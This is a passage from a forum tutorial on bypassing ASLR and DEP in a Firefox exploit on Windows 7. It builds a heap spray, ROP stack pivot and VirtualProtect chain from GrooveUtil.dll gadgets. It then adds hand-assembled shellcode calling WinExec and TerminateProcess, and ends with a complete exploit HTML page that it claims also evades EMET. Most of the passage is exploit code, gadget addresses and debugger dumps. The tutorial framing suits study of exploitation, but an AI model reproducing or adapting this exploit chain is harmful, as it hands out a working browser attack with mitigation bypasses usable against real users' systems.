One more thing, We are going to develop this exploit for win7 -win32 (you may check offsets for winxp, even offsets in win32 &amp; wow64 win7 also differs check them and fix them).<br/>
<br/>
Also install the EMET from microsoft website, It mitigates most of the shellcodes. But our shellcode will also bypass it and will be compact. <br/>
<br/>
Here is the result of above code:<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:132px;">EAX 0400B620
ECX 0C100000
EDX 0313D970
EBX 043D0E04
ESP 0018DFCC
EBP 0018E1D8
ESI 804B0002
EDI 80000000
EIP 010E010D</pre>
</div>The EIP register has been controlled by loading in a value from our chunk 0x010E010D. This value comes from "č%u 010E".<br/>
So we'll have to place the pointer of our first ROP gadget at "%u 010D%u 010E" place.<br/>
<br/>
The first task is to develop the ROP now and in ROP the first and most important and challenging task is the stack pivoting.<br/>
In stack pivot, the ESP register is loaded with the address to our own allocated heap chunk so that the browser will consider the allocated heap chunk as stack and this new manipulated stack contains all the return addresses and arguments to the called functions.<br/>
<br/>
What we have to do actually is we need to either move or swap the register containing address to our allocated heap block into ESP register. Or pop an address of our heap block from stack into ESP register, there can be several instructions.<br/>
<br/>
In this case the EAX register contains the pointer to pointer (pointer to address) of our allocated heap block and ecx contain the direct address to our allocated heap chunk.<br/>
So we need to discover the gadgets which encorporates either eax or ecx registers in case of stack pivoting. <br/>
<br/>
There are certain instructions like:<br/>
<br/>
<br/>
XCHG ECX,ESP<br/>
ret<br/>
<br/>
or<br/>
<br/>
mov esp,ecx<br/>
ret<br/>
<br/>
or<br/>
<br/>
XCHG dword ptr[EAX],ESP<br/>
ret<br/>
<br/>
or<br/>
<br/>
mov ESP,dword ptr[EAX]<br/>
ret<br/>
<br/>
or like these can be of help.<br/>
<br/>
But alas we cannot find anything useful, but following gadget was discovered:<br/>
<br/>
<br/>
6623BE51 : XCHG EAX,ESP<br/>
ret<br/>
<br/>
<br/>
into GR469A~1.DLL but we need to replace the "pointer to pointer" with direct pointer in EAX register before executing this gadget.<br/>
So we need to discover something like<br/>
<br/>
mov EAX,dword ptr[eax]<br/>
call eax<br/>
ret<br/>
<br/>
But, this following gadget was discovered and was pretty helpful:<br/>
<br/>
<br/>
661C5B33 : MOV EAX,DWORD PTR DS:[ECX]<br/>
CALL DWORD PTR DS:[EAX+8]<br/>
<br/>
<br/>
This gadget needs the address to be loaded into eax register at place where ECX register is pointing.<br/>
The ECX register points to first bytes of our heap block and then the next call will be made to the address at ECX + 8.<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:300px;">0C100000  01 01 02 01 03 01 04 01  
0C100008  05 01 06 01 07 01 08 01  
0C100010  09 01 0A 01 0B 01 0C 01  ...
0C100018  0D 01 0E 01 0F 01 11 01  .
0C100020  12 01 13 01 14 01 15 01  
0C100028  16 01 17 01 18 01 19 01  
0C100030  1A 01 1B 01 1C 01 1D 01  
0C100038  1E 01 1F 01 90 90 90 90  ����
0C100040  90 90 90 90 CC CC CC CC  ����ÌÌÌÌ
0C100048  CC CC CC CC BB BB CC CC  ÌÌÌÌ»»ÌÌ
0C100050  DD DD EE EE 63 61 6C 63  ÝÝîîcalc
0C100058  2E 65 78 65 00 00 CC CC  .exe..ÌÌ
0C100060  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100068  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100070  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100078  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100080  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100088  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100090  0C 0C 0C 0C 0C 0C 0C 0C  ........
0C100098  0C 0C 0C 0C 0C 0C 0C     .......
--- -- --
--- -- --
--- -- --</pre>
</div>So we need to place the first gadget address at 0C100018: 0D 01 0E 1E and change the 0C100000: 01 01 02 01 with address to (address of offset to the address of next gadget[ XCHG EAX,ESP;ret ])-8 that is at "%u 0107%u 0108" if at 0x0C100000 has 0x0C100004 <br/>
<br/>
Following code section:<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:252px;">var heap = unescape(
/* ROP : */            "% u0004%u 0c10"
                    +"% u0103%u 0104"
                    +"%u 0105% u0106"
                    +"%u BE51%u 6623"    // XCHG EAX,ESP;ret
                    +"%u 0109%u 010a"
                    +"% u010b%u 010c"
                    +"%u 5B33% u661C"    // :GR469A~1.DLL
                                    //    8B01             MOV EAX,DWORD PTR DS:[ECX]
                                    //    FF50 08          CALL DWORD PTR DS:[EAX+8]
                    +"% u010f% u0111"
                    +"%u 0112% u0113"
                    +"%u 0114%u 0115"
                    +"%u 0116%u 0117"
                    +"%u 0118% u0119"
                    +"% u011a%u 011b"
                    +"%u 011c%u 011d"
                    +"%u 011e%u 011f"
                    )</pre>
</div>It will result in loading our inted value into ESP register as following registers dump shows:<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:132px;">EAX 0029DF08
ECX 0C100000
EDX 03D19160
EBX 048C0124
ESP 0C100008
EBP 0029E118
ESI 804B0002
EDI 80000000
EIP 01040103</pre>
</div>And this will result into our heap block transformed into stack as shown below:<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:372px;">0C100000   0C100004
0C100004   01040103
0C100008   01060105
0C10000C   6623BE51  GR469A~1.6623BE51
0C100010   010A0109
0C100014   010C010B  firefox.010C010B
0C100018   661C5B33  GR469A~1.661C5B33
0C10001C   0111010F  firefox.0111010F
0C100020   01130112  firefox.01130112
0C100024   01150114  firefox.01150114
0C100028   01170116  firefox.01170116
0C10002C   01190118
0C100030   011B011A
0C100034   011D011C
0C100038   011F011E
0C10003C   90909090
0C100040   90909090
0C100044   CCCCCCCC
0C100048   CCCCCCCC
0C10004C   CCCCBBBB
0C100050   EEEEDDDD
0C100054   636C6163
0C100058   6578652E
0C10005C   CCCC0000
0C100060   0C0C0C0C
0C100064   0C0C0C0C
0C100068   0C0C0C0C
0C10006C   0C0C0C0C
0C100070   0C0C0C0C
0C100074   0C0C0C0C
0C100078   0C0C0C0C
0C10007C   0C0C0C0C
0C100080   0C0C0C0C
0C100084   0C0C0C0C
0C100088   0C0C0C0C
0C10008C   0C0C0C0C
0C100090   0C0C0C0C
0C100094   0C0C0C0C
0C100098   0C0C0C0C
0C10009C   0C0C0C0C
0C1000A0   0C0C0C0C
0C1000A4   0C0C0C0C
------
------
------</pre>
</div>First phase of our mission is now complete with successful stack pivot, so the next return instruction will land on the address in our stack (our heap block).<br/>
<br/>
Now next phase is to get a pointer to the kernel32.VirtualProtect function and put its arguments on our stack to bypass the DEP.<br/>
<br/>
The address to VirtualProtect will follow its arguments, it takes 4 argumenst, the first argument is the address to the first byte of the shellcode, the second argument is the size of the shellcode block; this can be any dword number but atleast the size of shellcode, 3rd argument is the FLAG the value must be 0x00000040 to set the attribute of memory page contaning shellcode as PAGE_READ_WRITE_EXECUTE. 4rth argument is the pointer to any writable location where old attribute value will be saved, this will be 0x0c0c0c0c in our case or whatever make sure it should be writable.<br/>
<br/>
The GrooveUtil.dll contains a call to VirtualProtect at : 0x68F2F1DD as:<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:84px;">68F2F1DD   FF15 BC71F668    CALL DWORD PTR DS:[&lt;&amp;KERNEL32.VirtualPro&gt;; kernel32.VirtualProtect
68F2F1E3   8BC6             MOV EAX,ESI
68F2F1E5   5E               POP ESI
68F2F1E6   C9               LEAVE
68F2F1E7   C2 0400          RETN 4</pre>
</div>We need to fix certain things on our stack prior to call to VirtualProtect.<br/>
<br/>
<br/>
POP ESI<br/>
LEAVE<br/>
RETN 4<br/>
<br/>
<br/>
The instruction that will cause trouble is LEAVE it fixes the stack by dissolving the stack frame. The stack frame is the block between ESP and EBP, and until now the EBP register points to an address that will make us lose our stack once again, so the EBP must contain an address just before the start of shellcode. <br/>
<br/>
Now we have the following code:<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:372px;">&lt;html&gt;
&lt;head&gt;
&lt;script type='text/javascript'&gt;
            var gravityInsightsParams = new Object();
            gravityInsightsParams.type = 'forum';
            gravityInsightsParams.site_guid = 'dfbf0463bd6f291d1e8d5d86e6db82b3';
            gravityInsightsParams.thread_id = 0;
            gravityInsightsParams.post_id = 0;
            gravityInsightsParams.forum_id = 0;
            gravityInsightsParams.user_id = 8;
            gravityInsightsParams.username = 'fb1h2s';
            gravityInsightsParams.post_title = '';
            gravityInsightsParams.thread_title = '';
            gravityInsightsParams.forum_title = '';
            gravityInsightsParams.board = '';
            gravityInsightsParams.pluginversion = '2.1.0';
            gravityInsightsParams.baseversion = '2.1.0';

                document.write(unescape('%3Cscript src=\'http://cdn.insights.gravity.com/moth-min.js\' type=\'text/javascript\'%3E%3C/script%3E'));
                &lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;object id="d" &gt;&lt;/object&gt;
&lt;script&gt;

function ignite()    {
    var e=document.getElementById("d");
    e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
    
    var vftable = unescape("\x00� c10");
    // ROP using GrooveUtil.dll :
    var heap = unescape("%u 0004%u 0c10"
                    +"%u BCBB%u 68F1"    //POP EDI; POP EBX; POP ESI; RETN
                    +"%u 0105%u 0106"    //
                    +"%u BE51%u 6623"    // XCHG EAX,ESP;ret
                    +"%u 0030%u 0c10" //
                    +"%u 7C2A%u 68F0"    // POP EDI; POP EBP; RETN


                    +"%u 5B33%u 661C"    // :GR469A~1.DLL
                                    //    8B01             MOV EAX,DWORD PTR DS:[ECX]
                                    //    FF50 08          CALL DWORD PTR DS:[EAX+8]
                    +"% u0030% u0c10"    // will be popped in ebp
                    +"%u F1DD% u68F2"    // Pointer to Virtual Protect
                    +"% u0030% u0c10"        // Base Address of Shellcode
                    +"% u9000% u0000"        // Size of the Page, you can adjust it
                    +"%u 0040% u0000"        // PAGE_EXECUTE_READ_WRITE
                    +"% u0c0c%u 0c0c"        // Writable Location for preserving old attributes
                    +"%u 0038%u 0c10"        // will be popped in esi
                    )
/* Shellcode : */    +unescape("%u 9090%u 9090"+"% u9090% u9090"
                    +"%u CCCC% uCCCC% uCCCC% uCCCC"
                    +"%u BBBB%u CCCC%u DDDD%u EEEE"
/* command: */        +"% u6163% u636c% u652e% u6578% u0000% ucccc"    // calc.exe
                    );

        var vtable = unescape("%u 0c0c% u0c0c");
        while(vtable.length &lt; 0x10000) {vtable += vtable;}
        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
        var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
        var spray = new Array()
        for (var iter=0;iter&lt;0x100;iter++){
           spray[iter] = finalspray+heap;
        }
    e.data="";
}
&lt;/script&gt;
&lt;input type=button value="Ignite" onclick="ignite()" /&gt;
&lt;script type="text/javascript"&gt;
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
&lt;/script&gt;
&lt;script type="text/javascript"&gt;
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>And it will result into the successful DEP bypass and EIP now lands on our shellcode but the debuggerbreak is called as 0xcc instruction is countered.<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:132px;">EAX 0C100030
ECX 0C0FFFDC
EDX 770264F4 ntdll.KiFastSystemCallRet
EBX 6623BE51 GR469A~1.6623BE51
ESP 0C10003C
EBP 0C0C0C0C
ESI 0C100038
EDI 661C5B33 GR469A~1.661C5B33
EIP 0C100041</pre>
</div>Now comes the next phase of our mission, the shellcode formation. We have two registers containing addresses within GR469A~1.dll<br/>
<br/>
<br/>
EBX 6623BE51 GR469A~1.6623BE51<br/>
EDI 661C5B33 GR469A~1.661C5B33<br/>
<br/>
<br/>
We need to find any call to any Kernel32.dll export function and then we'll make EAX register to point to the kernel32 export, now we can add or subtract the proper offset (These offsets are OS dependent you may need to calculate in ur own cases) to make make EAX point to kernel32.WinExec function, then we'll push the arguments, it takes two arguments, first pointer determines whether the window is shown for executed command or not and second argument is the pointer to the command line you want to execute. <br/>
<br/>
Following instructions will work for us:<br/>
as EDI contains an address inside the dll we need to fix it by adding an offset to make it point to the location where address of export Kernel32.dll is located.<br/>
<br/>
81C7 6D980700 ADD EDI,7986D<br/>
<br/>
Following will be the javascript unicode representation for it:<br/>
<br/>
"% uC781%u 986D%u 0007"<br/>
<br/>
Remember interchange the bytes in pair, if the number of bytes is odd then the begining of last pair can be made to a nop 90.<br/>
Then we will take the address of Kernel32 address into EAX register from pointer to pointer [EDI]:<br/>
<br/>
8B07 MOV EAX,DWORD PTR DS:[EDI]<br/>
<br/>
this will yield "%u 078B" The EAX now contains the address of "Kernel32.WaitForSingleObject".<br/>
<br/>
0004EFA0 WaitForSingleObject<br/>
<br/>
The RVA of WinExec is as follows:<br/>
<br/>
0008E695 WinExec<br/>
<br/>
Now we need to calculate the offset:<br/>
0008E695 - 0004EFA0 = 3F6F5<br/>
<br/>
So we need to add EAX + 3F6F5 to make EAX point to WinExec.<br/>
<br/>
05 F5F60300 ADD EAX,3F6F5<br/>
<br/>
In javascript it will be:<br/>
<br/>
"%u F505% u03F6 %u 9000"<br/>
<br/>
Then we'll push 5 as an argument to WinExec.<br/>
<br/>
6A 05 PUSH 5<br/>
<br/>
This becomes<br/>
<br/>
"%u 056A"<br/>
5 means window will be shown.<br/>
<br/>
Then we have ecx pointing to somewhere in our heap block.<br/>
<br/>
ECX = 0x0C0FFFDC<br/>
<br/>
We need to fix it also to make it to point to the command to be executed by adding 0x8E it will point to calc.exe.<br/>
<br/>
81C1 8E000000 ADD ECX,8E<br/>
<br/>
Its javascript block will be:<br/>
<br/>
"%u C181% u008E% u0000"<br/>
<br/>
and push ecx on stack<br/>
<br/>
51 PUSH ECX<br/>
<br/>
Its javascript will be<br/>
"%u 9051"<br/>
<br/>
And now the jackpot :<br/>
FFD0 CALL EAX<br/>
<br/>
"%u D0FF"<br/>
<br/>
And with this, you'll hit the jackpot.<br/>
But wait, we also need to terminate the process gently, so copy the eax to some other register like ESI<br/>
then fix ESI to point to TerminateProcess and push its argument it needs the handle to process, the pseudo handle to current process is 0xFFFFFFFF or u need to push -1 and call ESI.<br/>
<br/>
Then the command buffer will also be in same manner<br/>
<br/>
calc.exe<br/>
<br/>
"%u 6163% u636c% u652e%u 6578%u 0000" <br/>
<br/>
Following is the complete exploit code, with handcrafted &amp; compact shellcode, even EMET will also be mitigated itself:<br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code" style="height:372px;">&lt;html&gt;
&lt;head&gt;
&lt;script type='text/javascript'&gt;
            var gravityInsightsParams = new Object();
            gravityInsightsParams.type = 'forum';
            gravityInsightsParams.site_guid = 'dfbf0463bd6f291d1e8d5d86e6db82b3';
            gravityInsightsParams.thread_id = 0;
            gravityInsightsParams.post_id = 0;
            gravityInsightsParams.forum_id = 0;
            gravityInsightsParams.user_id = 8;
            gravityInsightsParams.username = 'fb1h2s';
            gravityInsightsParams.post_title = '';
            gravityInsightsParams.thread_title = '';
            gravityInsightsParams.forum_title = '';
            gravityInsightsParams.board = '';
            gravityInsightsParams.pluginversion = '2.1.0';
            gravityInsightsParams.baseversion = '2.1.0';

                document.write(unescape('%3Cscript src=\'http://cdn.insights.gravity.com/moth-min.js\' type=\'text/javascript\'%3E%3C/script%3E'));
                &lt;/script&gt;
&lt;script type="text/javascript" src="vbseo/resources/scripts/vbseo_ui.js?v=a4"&gt;&lt;/script&gt;
&lt;script type="text/javascript"&gt;
 YAHOO.util.Event.onDOMReady(function (){
     vbseoui = new vBSEO_UI();
     vbseoui.page_init(Array('postbody','blogbit','content','postcontainer','vbseo_like_postbit'), Array("php",1));
 });
&lt;/script&gt;
 

&lt;script type="text/javascript"&gt;&lt;!--
window.google_analytics_uacct = 'UA-17311051-3'; var _gaq = _gaq || []; _gaq.push(['_setAccount', 'UA-17311051-3'], ['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);  })();
//--&gt;&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;object id="d" &gt;&lt;/object&gt;
&lt;script&gt;

function ignite()    {
    var e=document.getElementById("d");
    e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0);
    
    var vftable = unescape("\x00% u0c10");
    // ROP using GrooveUtil.dll :
    var heap = unescape("% u0004% u0c10"
                    +"% uBCBB% u68F1"    //POP EDI; POP EBX; POP ESI; RETN
                    +"%u 0105% u0106"    //
                    +"%u BE51%u 6623"    // XCHG EAX,ESP;ret
                    +"%u 0030% u0c10"
                    +"% u7C2A% u68F0"    // POP EDI; POP EBP; RETN


                    +"% u5B33% u661C"    // :GR469A~1.DLL
                                    //    8B01             MOV EAX,DWORD PTR DS:[ECX]
                                    //    FF50 08          CALL DWORD PTR DS:[EAX+8]
                    +"% u0030% u0c10"    // will be popped in ebp
                    +"% uF1DD% u68F2"    // Pointer to Virtual Protect
                    +"% u0030% u0c10"        // Base Address of Shellcode
                    +"% u9000% u0000"        // Size of the Page, you can adjust it
                    +"% u0040% u0000"        // PAGE_EXECUTE_READ_WRITE
                    +"% u0c0c% u0c0c"        // Writable Location for preserving old attributes
                    +"% u0038% u0c10"        // will be popped in esi
                    )
                    +unescape("% u9090% u9090"+"% u9090% u9090"
                    +"% uC781% u986D%u 0007"    //81C7 6D980700    ADD EDI,7986D
                    +"% u078B"    //8B07             MOV EAX,DWORD PTR DS:[EDI]
                    +"% uF505%u 03F6% u9000"    //05 F5F60300      ADD EAX,3F6F5;90 NOP
                    +"% u9090"
                    +"% u056A"    //6A 05            PUSH 5
                    +"% uC181% u008E% u0000"    //81C1 8E000000    ADD ECX,8E
                    +"% u9051"    //51    PUSH ECX; 90 NOP
                    +"% uF08B"    //8BF0             MOV ESI,EAX
                    +"% uD0FF"    //FFD0             CALL EAX
//                    +"% ucccc"
                    +"%u EE81% u95Fa% u0004"//81EE FA950400    SUB ESI,495FA
                    +"%u FF6A"    //6A FF            PUSH -1
                    +"%u D6FF"    //FFD6             CALL ESI
                    +"%u CCCC"
/* command: */        +"% u6163% u636c% u652e% u6578% u0000% ucccc"
                    );

        var vtable = unescape("% u0c0c%u 0c0c");
        while(vtable.length &lt; 0x10000) {vtable += vtable;}
        var heapblock = heap+vtable.substring(0,0x10000/2-heap.length*2);
        while (heapblock.length&lt;0x80000) {heapblock += heap+heapblock;}
        var finalspray = heapblock.substring(0,0x80000 - heap.length - 0x24/2 - 0x4/2 - 0x2/2);
        var spray = new Array()
        for (var iter=0;iter&lt;0x100;iter++){
            spray[iter] = finalspray+heap;
        }
    e.data="";
}
&lt;/script&gt;
&lt;input type=button value="Ignite" onclick="ignite()" /&gt;
&lt;script type="text/javascript"&gt;
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
&lt;/script&gt;
&lt;script type="text/javascript"&gt;
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>Note: Remember to remove the spaces around % and u.<br/>
<br/>
Thanx<br/>
..."vinnu"</div>

	

	
		<script src="clientscript/vbulletin_lightbox6719.html?v=421" type="text/javascript"></script>
		<script type="text/javascript">
		<!--
		vBulletin.register_control("vB_Lightbox_Container", "article_content", 1);
		//-->
		</script>
	

	

	
		<sub class="article_promoted_text">
			This article was originally published in blog:
			<a href="blogf35f.html?u=61">ASLR DEP bypassing techniques</a>
			started by
			<a href="memberf35f.html?u=61">&amp;quot;vinnu&amp;quot;</a>
		</sub>
	
	<div class="cmslinks">

		
	
	</div>

    
	<script type="text/javascript">
	var THREADID = 1539;
	var THIS_URL = "content43c2.html?r=92-ASLR-DEP-bypassing-techniques";
	var MIN_CHARS = 30;
	vbphrase['comment'] = "Comment";
	vbphrase['comments'] = "Comments";
</script>
<div class="cms_comments_page" id="comments">
	<a name="comments_start"></a>
	
	<script src="clientscript/vbulletin-editor6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_quick_edit6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_post_loader6719.html?v=421" type="text/javascript"></script>
	<div id="node_comments_hide"></div>
	<!-- EDITOR IS BREAKING THE PAGE -->
	
</div>


</div></li>
</ul>
					</div>
				</div>
			</div>
		</div>
		<div class="yui-b yui-sidebar">
			<ul class="list_no_decoration widget_list" id="widgetlist_column3">
<li><div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
		<h3><img alt="" src="images/site_icons/html.png"/> G4H Facebook</h3>
		</div>
		<div class="cms_widget_content widget_content">
		<div class="fb-like-box" data-colorscheme="light" data-header="true" data-height="250" data-href="https://www.facebook.com/pages/Garage4Hackers/138904662794635" data-show-border="true" data-show-faces="true" data-stream="false" data-width="300"></div>
		</div>
	</div>
</div></li><li><div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
		<h3><img alt="" src="images/site_icons/html.png"/> G4H Twitter</h3>
		</div>
		<div class="cms_widget_content widget_content">
		<a class="twitter-timeline" data-widget-id="387207513831010305" href="https://twitter.com/garage4hackers">Tweets by @garage4hackers</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
		</div>
	</div>
</div></li>
</ul>
		</div>
	</div>
</div>

</div>

<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script></div>
</div>

<div class="floatcontainer footer" id="footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" class="footer_select" id="footer_select" method="get">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label=" Standard Styles">
									
					
	<option class="" selected="selected" value="1">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label=" Mobile Styles">
					
					
	<option class="" value="2">-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul class="footer_links" id="footer_links">
		<li><a accesskey="9" href="sendmessage.html" rel="nofollow">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="#" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="content43c2.html?r=92-ASLR-DEP-bypassing-techniques#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div class="shade footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">03:54 PM</span>.</div>

<div class="shade footer_copyright" id="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div class="shade footer_morecopyright" id="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	<img alt="" border="0" height="1" src="cron1719.gif?rand=1584872666" width="1"/>
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script src="clientscript/vbulletin_facebook6719.js?v=421" type="text/javascript"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>

</div></body></html>